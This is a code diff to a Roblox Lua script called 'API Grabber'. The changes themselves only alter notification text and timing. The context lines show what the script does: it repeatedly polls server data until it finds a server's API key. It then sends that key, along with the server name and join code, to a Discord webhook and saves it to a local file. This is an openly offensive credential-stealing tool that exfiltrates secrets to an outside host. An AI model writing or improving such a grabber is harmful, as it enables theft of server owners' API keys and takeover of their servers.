@@ -96,12 +96,13 @@ local function safeSendToDiscord(apiKey, sName, jCode)
     return success
 end
 
-local function safeNotify(title, text)
+local function safeNotify(title, text, duration)
+    duration = duration or 5
     local success = pcall(function()
         game:GetService("StarterGui"):SetCore("SendNotification", {
             Title = tostring(title),
             Text = tostring(text),
-            Duration = 3
+            Duration = duration
         })
     end)
     if not success then
@@ -121,13 +122,20 @@ local function safeWriteFile(path, content)
 end
 
 local function waitForAPIKey()
+    safeNotify("API Grabber", "Starting search for API key...", 5)
+    
     while not apiKeyFound do
         attemptCount = attemptCount + 1
-        safeNotify("API Grabber", "Attempt " .. attemptCount .. " - Fetching server data...")
+        
+        if attemptCount == 1 then
+            safeNotify("API Grabber", "Attempt " .. attemptCount .. " - Checking for API key...", 3)
+        else
+            safeNotify("API Grabber", "⚠️ NO API KEY FOUND YET ⚠️ - Attempt " .. attemptCount .. " - Retrying in " .. settings.retryDelay .. " seconds...", 4)
+        end
         
         local serverData = safeGetServerData()
         if not serverData then
-            safeNotify("API Grabber", "Could not fetch server data, retrying in " .. settings.retryDelay .. " seconds...")
+            safeNotify("API Grabber", "❌ Failed to fetch server data - Retrying in " .. settings.retryDelay .. " seconds...", 4)
             task.wait(settings.retryDelay)
             goto continue
         end
@@ -135,7 +143,7 @@ local function waitForAPIKey()
         local apiKey = safeGetAPIKey(serverData)
         if apiKey and apiKey ~= "" and apiKey ~= "No API key found" then
             apiKeyFound = true
-            safeNotify("Success", "API key found on attempt " .. attemptCount .. "!")
+            safeNotify("✅ SUCCESS!", "API key found on attempt " .. attemptCount .. "! Sending to webhook...", 5)
             
             local currentServerName = serverName or "Unknown"
             local currentJoinCode = joinCode or "Unknown"
@@ -156,17 +164,24 @@ local function waitForAPIKey()
                 local folderPath = settings.baseDownloadLocation .. (finalServerName:gsub('[<>:"/\\|?*]', "_") or "server")
                 local fileContent = "Server: " .. tostring(finalServerName) .. "\nJoin Code: " .. tostring(finalJoinCode) .. "\nAPI Key: " .. tostring(apiKey) .. "\nFound on attempt: " .. attemptCount
                 safeWriteFile(folderPath .. "/api_key.txt", fileContent)
-                safeNotify("Saved", "API key saved to file")
+                safeNotify("💾 Saved", "API key saved to file", 3)
             end
             
-            safeNotify("Complete", "API key retrieval finished after " .. attemptCount .. " attempts")
+            safeNotify("🎉 COMPLETE!", "API key retrieval finished after " .. attemptCount .. " attempts", 5)
             return true
         else
-            safeNotify("API Grabber", "No API key found yet, retrying in " .. settings.retryDelay .. " seconds...")
             if settings.maxRetries > 0 and attemptCount >= settings.maxRetries then
-                safeNotify("Failed", "Max retries reached (" .. settings.maxRetries .. ") - API key not found")
+                safeNotify("❌ FAILED", "Max retries reached (" .. settings.maxRetries .. ") - API key not found. Stopping loop.", 5)
                 return false
             end
+            
+            local remainingText = ""
+            if settings.maxRetries > 0 then
+                local remaining = settings.maxRetries - attemptCount
+                remainingText = " (" .. remaining .. " attempts remaining)"
+            end
+            
+            safeNotify("🔄 LOOPING", "No API key found yet - Attempt " .. attemptCount .. remainingText .. " - Next check in " .. settings.retryDelay .. " seconds", 4)
             task.wait(settings.retryDelay)
         end
         
@@ -176,17 +191,19 @@ local function waitForAPIKey()
 end
 
 local function main()
-    safeNotify("API Grabber", "Starting infinite loop until API key is found...")
+    safeNotify("API Grabber", "Starting infinite loop until API key is found...", 5)
     
     if settings.maxRetries > 0 then
-        safeNotify("API Grabber", "Will retry up to " .. settings.maxRetries .. " times")
+        safeNotify("API Grabber", "Configuration: Will retry up to " .. settings.maxRetries .. " times (Delay: " .. settings.retryDelay .. "s)", 4)
     else
-        safeNotify("API Grabber", "Will retry indefinitely until API key is found")
+        safeNotify("API Grabber", "Configuration: 🔄 INFINITE LOOP MODE - Will retry forever until API key is found (Delay: " .. settings.retryDelay .. "s)", 5)
     end
+    
+    safeNotify("API Grabber", "Waiting for server to populate API key...", 4)
     
     local success = waitForAPIKey()
     if not success then
-        safeNotify("Error", "Failed to retrieve API key")
+        safeNotify("Error", "Failed to retrieve API key after " .. attemptCount .. " attempts", 5)
     end
 end
 
@@ -206,7 +223,7 @@ local function safeStart(config)
     
     local success, err = pcall(main)
     if not success then
-        safeNotify("Fatal Error", "Script encountered an error: " .. tostring(err))
+        safeNotify("Fatal Error", "Script encountered an error: " .. tostring(err), 5)
         print("Fatal Error:", err)
     end
 end
